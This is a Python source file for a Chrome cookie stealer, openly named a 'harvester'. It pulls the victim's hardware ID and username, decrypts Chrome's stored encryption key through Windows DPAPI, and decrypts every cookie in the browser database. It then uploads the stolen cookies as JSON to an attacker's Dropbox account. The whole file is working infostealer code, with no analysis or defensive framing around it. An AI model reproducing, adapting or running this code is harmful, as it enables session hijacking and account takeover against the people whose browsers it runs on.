import os
import subprocess
import json
import base64
import sqlite3
import shutil
import dropbox
from time import time
from datetime import datetime, timedelta
import win32crypt
from Crypto.Cipher import AES
from subprocess import check_output
from os import getlogin

class DropboxChromeCookieHarvester:

    @staticmethod
    def _get_chrome_datetime(chromedate) -> str:
        if chromedate != 86400000000 and chromedate:
            try:
                return str(datetime(1601, 1, 1) + timedelta(microseconds=chromedate))
            except Exception as e:
                print(f"Error: {e}, chromedate: {chromedate}")
                return str(chromedate)
        else:
            return ""

    @staticmethod
    def _get_encryption_key() -> bytes:
        # cookies are stored in
        # C:\Users\<uname>\AppData\Local\Google\Chrome\User Data\Local State
        local_state_path = os.path.join(os.environ["USERPROFILE"],
                                        "AppData", "Local", "Google", "Chrome",
                                        "User Data", "Local State")
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = f.read()
            local_state = json.loads(local_state)
        # encryption key is stored in b64 in Local State under "os_crypt" "encrypted_key"
        # decode the encryption key from Base64
        key: bytes = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        # remove 'DPAPI' str
        key = key[5:]
        # return decrypted key that was originally encrypted
        # using a session key derived from current user's logon credentials
        # doc: http://timgolden.me.uk/pywin32-docs/win32crypt.html
        return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

    @staticmethod
    def _decrypt_data(data, key) -> str:
        try:
            # get the initialization vector
            iv = data[3:15]
            data = data[15:]
            # generate cipher
            cipher = AES.new(key, AES.MODE_GCM, iv)
            # decrypt password
            # convert back to str
            return cipher.decrypt(data)[:-16].decode('utf-8')
        except:
            try:
                # str of decrypted data
                return str(win32crypt.CryptUnprotectData(data, None, None, None, 0)[1])
            except:
                # not supported
                # return empty str, unable to decrypt
                return ""

    def __init__(self, config: dict):
        # change output_json_filepath to output_dropbox_dirpath, and make filename ms timestamp + '.txt'
        self.config = config
        self._victim_hwid = subprocess.check_output('wmic csproduct get uuid').decode().split('\n')[1].split(' ')[0]
        self._victim_username = os.getlogin()
        substr_replacements: dict = {
            '`hwid`': self._victim_hwid,
            '`victim_username`': self._victim_username
        }
        # replace special substrs in config
        for key in self.config.keys():
            if type(self.config[key]) is not str:
                continue
            for old_substr, new_substr in substr_replacements.items():
                self.config[key] = self.config[key].replace(old_substr, new_substr)
    
    def run(self) -> None:
         # local sqlite Chrome cookie database path
        db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                                "Google", "Chrome", "User Data", "Default", "Network", "Cookies")
        # copy the file to current directory
        # as the database will be locked if chrome is currently open
        filename = self.config['copy_db_filepath']
        if not os.path.isfile(filename):
            # copy file when does not exist in the current directory
            shutil.copyfile(db_path, filename)
        # connect to the database
        db = sqlite3.connect(filename)
        # ignore decoding errors
        db.text_factory = lambda b: b.decode(errors="ignore")
        cursor = db.cursor()
        # get the cookies from `cookies` table
        cursor.execute("""
        SELECT host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value 
        FROM cookies""")
        # get the AES key
        key = self._get_encryption_key()
        # gather the cookies into a list
        cookies = []
        for host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value in cursor.fetchall():
            if not value:
                decrypted_value = self._decrypt_data(encrypted_value, key)
            else:
                # already decrypted
                decrypted_value = value
            cookies.append({
                'host': host_key,
                'cookie_name': name,
                'decrypted_cookie_val': decrypted_value,
                'creation_datetime_UTC': self._get_chrome_datetime(creation_utc),
                'last_access_datetime_UTC': self._get_chrome_datetime(last_access_utc),
                'expires_datetime_UTC': self._get_chrome_datetime(expires_utc)
            })
        # upload the cookie list to a .json file on dropbox
        dbx = dropbox.Dropbox(self.config['dropbox_token'])
        content = json.dumps(cookies, indent=self.config['output_json_indent_level'])
        output_filename = str(round(time() * 1000)) + '.json'
        dropbox_filepath = (self.config['output_dropbox_dirpath'] + '/' + output_filename).replace('//', '/')
        dbx.files_upload(content.encode('utf-8'), dropbox_filepath)
        # commit changes
        db.commit()
        # close connection
        db.close()
        os.remove(self.config['copy_db_filepath'])